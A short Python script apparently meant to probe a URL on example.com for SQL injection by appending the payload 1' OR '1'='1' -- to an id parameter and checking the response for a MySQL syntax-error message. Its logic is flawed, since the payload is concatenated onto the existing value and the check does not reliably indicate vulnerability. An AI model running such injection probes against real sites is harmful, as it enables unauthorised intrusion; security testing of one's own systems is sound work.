import requests

url = "http://example.com/user_info.php?id=1"

payload = "1' OR '1'='1' -- "
new_url = url + payload

response = requests.get(new_url)

if "error in your SQL syntax" in response.text:
    print("Vulnerable to SQL injection")
else:
    print("Not vulnerable to SQL injection")
